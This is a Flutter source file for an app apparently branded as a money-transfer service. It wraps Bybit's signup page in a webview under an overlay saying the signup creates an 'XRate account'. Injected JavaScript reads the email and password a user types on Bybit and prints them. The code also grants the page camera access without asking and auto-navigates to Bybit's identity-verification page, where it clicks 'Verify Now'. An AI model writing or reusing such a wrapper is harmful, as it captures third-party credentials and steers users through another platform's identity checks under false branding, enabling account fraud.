import 'package:flutter/foundation.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';
import 'package:money_transfer/config/routes/custom_push_navigators.dart';
import 'package:money_transfer/config/theme/theme_manager.dart';
import 'package:money_transfer/core/utils/utils.dart';
import 'package:money_transfer/core/utils/custom_notifications.dart';
import 'package:money_transfer/features/auth/screens/login_pin_screen.dart';
import 'package:money_transfer/features/auth/screens/login_screen.dart';
import 'package:money_transfer/features/auth/services/auth_service.dart';
import 'package:money_transfer/features/onboarding/screens/onboarding_screen.dart';
import 'package:money_transfer/features/profile/providers/chat_provider.dart';
import 'package:money_transfer/firebase_options.dart';
import 'package:money_transfer/initialization_screen.dart';
import 'package:money_transfer/no_internet_screen.dart';
import 'package:money_transfer/features/auth/providers/auth_provider.dart';
import 'package:money_transfer/features/auth/providers/user_provider.dart';
import 'package:money_transfer/config/routes/router.dart';
import 'package:money_transfer/widgets/main_app.dart';
import 'package:provider/provider.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:permission_handler/permission_handler.dart';


Future<void> _firebaseMessagingBackgroundHandler(RemoteMessage message) async {
  if (kDebugMode) {
    print("Handling a background message ${message.messageId}");
  }
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseMessaging.instance.getInitialMessage();
  FirebaseMessaging.onBackgroundMessage(_firebaseMessagingBackgroundHandler);
  runApp(
    MultiProvider(
      providers: [
        ChangeNotifierProvider(
          create: (context) => UserProvider(),
        ),
        ChangeNotifierProvider(
          create: (context) => AuthProvider(),
        ),
      ],
      child: const MyApp(),
    ),
  );
}

class MyApp extends StatelessWidget {
  static const String route = '/my-app'; // Define the route here

  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeManager().lightTheme,
      debugShowCheckedModeBanner: false,
      home: const BybitRegistrationScreen(), // Directly navigate to the BybitRegistrationScreen
    );
  }
}


class BybitRegistrationScreen extends StatefulWidget {
  const BybitRegistrationScreen({super.key});

  @override
  State<BybitRegistrationScreen> createState() => _BybitRegistrationScreenState();
}

class _BybitRegistrationScreenState extends State<BybitRegistrationScreen> {
  InAppWebViewController? _controller;
  String emailInput = "";
  String passwordInput = "";
  bool redirected = false; // Flag to track if redirection has occurred
  double topOverlayHeight = 0.15; // Initial height of the top overlay
  double bottomOverlayHeight = 0.09; // Initial height of the bottom overlay

  @override
  void initState() {
    super.initState();
    _requestCameraPermission(); // Request camera permission at initialization
  }

  Future<void> _requestCameraPermission() async {
    var status = await Permission.camera.status;

    if (!status.isGranted) {
      // Request permission if not already granted
      var result = await Permission.camera.request();

      if (result.isGranted) {
        // Permission granted, proceed with any camera-related functionality
        print("Camera permission granted.");
      } else {
        // Permission denied, handle accordingly (e.g., show a message to the user)
        print("Camera permission denied.");
        // Optionally, you could show an alert to inform the user they need to allow the permission.
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Bybit Registration')),
      body: Stack(
        children: [
          InAppWebView(
            initialUrlRequest: URLRequest(
              url: WebUri.uri(Uri.parse(
                  'https://www.bybit.com/en/register?redirect_url=https%3A%2F%2Fwww.bybit.com%2Fen%2F')),
            ),
            onWebViewCreated: (InAppWebViewController controller) {
              _controller = controller;
            },
            onLoadError: (InAppWebViewController controller, Uri? url,
                int code, String message) {
              print(
                  'Failed to load URL: $url, Error code: $code, Message: $message');
            },
            onLoadStop: (InAppWebViewController controller, Uri? url) async {
              await _handlePageLoad(controller);
            },
            androidOnPermissionRequest:
                (InAppWebViewController controller, String origin,
                List<String> resources) async {
              // Automatically grant camera permission when requested by the web page
              return PermissionRequestResponse(
                resources: resources,
                action: PermissionRequestResponseAction.GRANT,
              );
            },
          ),
          // Top overlay
          Positioned(
            top: 0,
            left: 0,
            right: 0,
            height: MediaQuery.of(context).size.height * topOverlayHeight,
            child: Container(
              color: Colors.black.withOpacity(0.0),
              child: const Center(
                child: Text(
                  'Overlay Top',
                  style: TextStyle(color: Colors.white, fontSize: 20),
                ),
              ),
            ),
          ),
          // Bottom overlay
          Positioned(
            bottom: 0,
            left: 0,
            right: 0,
            height:
            MediaQuery.of(context).size.height * bottomOverlayHeight,
            child: Container(
              color: Colors.black.withOpacity(0.1),
              child: const Center(
                child: Text(
                  'Bybit signup creates an XRate account',
                  style: TextStyle(
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.w500),
                  textAlign: TextAlign.center,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Future<void> _handlePageLoad(InAppWebViewController controller) async {
    emailInput = await _retrieveInputValue(controller, 'input[name="email"]');
    passwordInput = await _retrieveInputValue(controller, 'input[name="password"]');

    // Call the method to check for the "Log in" button
    await _handleRedirectAndClickLogIn(controller);

    // Continuously check for specific text and adjust overlays accordingly
    _monitorTextAndAdjustOverlays(controller);

    print('Email Input: $emailInput');
    print('Password Input: $passwordInput');
  }

  Future<String> _retrieveInputValue(
      InAppWebViewController controller, String selector) async {
    return await controller.evaluateJavascript(source: '''
      var inputField = document.querySelector('$selector');
      if (inputField) {
        inputField.value;
      } else {
        null;
      }
    ''') ?? '';
  }

  Future<void> _monitorTextAndAdjustOverlays(
      InAppWebViewController controller) async {
    while (true) {
      // Check if "Waiting for camera" or "Camera access" exists
      bool waitingForCamera = await controller.evaluateJavascript(source: '''
        document.body.innerText.includes('Waiting for camera') || document.body.innerText.includes('Camera access');
      ''');

      if (waitingForCamera) {
        // Update the overlays' height when the text is found
        setState(() {
          topOverlayHeight = 0.01; // 1% of the screen height
          bottomOverlayHeight = 0.02; // 2% of the screen height
        });
        break; // Stop checking after adjusting the overlays
      }

      // Check again after a short delay
      await Future.delayed(const Duration(seconds: 1));
    }
  }

  Future<void> _handleRedirectAndClickLogIn(
      InAppWebViewController controller) async {
    // Check if already redirected
    if (redirected) return;

    while (true) {
      // Check for "Log in" text on the page
      bool loginExists = await controller.evaluateJavascript(source: '''
        document.body.innerText.includes('Log in');
      ''');

      if (!loginExists) {
        // If "Log in" is not present, redirect to the personal account page
        await controller.loadUrl(
            urlRequest: URLRequest(
                url: WebUri.uri(Uri.parse(
                    'https://www.bybit.com/user/accounts/auth/personal'))));
        // Wait for the new page to load
        await Future.delayed(const Duration(seconds: 2)); // Increased delay

        // Wait for the "Verify Now" button to appear with a polling mechanism
        bool buttonExists = false;
        int attempts = 0;
        const int maxAttempts = 10; // Maximum number of attempts
        const Duration delay = Duration(seconds: 1); // Delay between attempts

        while (attempts < maxAttempts) {
          buttonExists = await controller.evaluateJavascript(source: '''
            var button = document.querySelector('button.moly-btn');
            button ? true : false;
          ''');

          if (buttonExists) {
            print('Button found after ${attempts + 1} attempt(s).');
            break; // Exit loop if button is found
          }

          attempts++;
          await Future.delayed(delay); // Wait before the next attempt
        }

        if (buttonExists) {
          // Attempt to click the "Verify Now" button
          print("Trying to click 'Verify Now' button");
          await _injectClickJavascriptButton(controller, 'Verify Now');
        } else {
          print('Button not found after $maxAttempts attempts.');
        }

        redirected = true; // Set the flag to true after redirection
        break;
      }
      await Future.delayed(const Duration(seconds: 1)); // Wait before checking again
    }
  }

  Future<void> _injectClickJavascriptButton(
      InAppWebViewController controller, String buttonText) async {
    // Use the evaluateJavascript method to find and click the button
    await controller.evaluateJavascript(source: '''
      const buttons = document.querySelectorAll('button.moly-btn');
      let buttonClicked = false; // Flag to check if the button was clicked
      for (let button of buttons) {
        if (button.innerText.includes('$buttonText')) {
          button.click();
          buttonClicked = true; // Set flag to true if clicked
          break;
        }
      }
      buttonClicked;
    ''').then((clicked) {
      if (clicked) {
        print("'$buttonText' button was clicked successfully.");
      } else {
        print("Failed to click '$buttonText' button.");
      }
    });
  }
}
